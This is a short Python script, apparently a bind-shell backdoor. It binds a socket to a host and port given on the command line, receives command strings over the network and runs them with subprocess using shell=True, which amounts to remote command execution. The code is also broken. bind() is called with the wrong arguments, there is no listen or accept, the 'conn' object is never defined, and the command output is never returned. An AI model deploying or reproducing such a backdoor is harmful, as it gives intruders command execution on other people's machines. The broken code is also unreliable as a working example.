import socket, subprocess as sp, sys

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(host, port)

while 1:
    command = str(conn.recv(1024))
    if command != "Exit()":
        sh = sp.Popen(command, shell=True,
                      stdout = sp.PIPE,
                      stderr = sp.PIPE,
                      stdin = sp.PIPE)
        out, err = sh.communicate()
        result = str(out) + str(err)
        lenght = str(len(result)).zfill(16)
    else:
        break
    
conn.close()